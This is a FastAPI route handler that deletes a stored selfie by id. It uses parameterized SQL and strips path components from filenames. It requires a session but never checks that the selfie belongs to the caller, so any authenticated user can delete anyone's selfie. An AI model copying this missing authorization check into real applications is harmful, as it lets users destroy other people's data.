@app.post("/delete_selfie")
async def delete_selfie(selfie_id: int = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("SELECT filename FROM selfies WHERE id = ?", (selfie_id,))
    row = c.fetchone()
    if row:
        safe_name = os.path.basename(row["filename"])
        filepath = os.path.join(SELFIE_DIR, safe_name)
        if os.path.exists(filepath):
            os.remove(filepath)
        c.execute("DELETE FROM selfies WHERE id = ?", (selfie_id,))
        db.commit()
    return {"status": "success"}
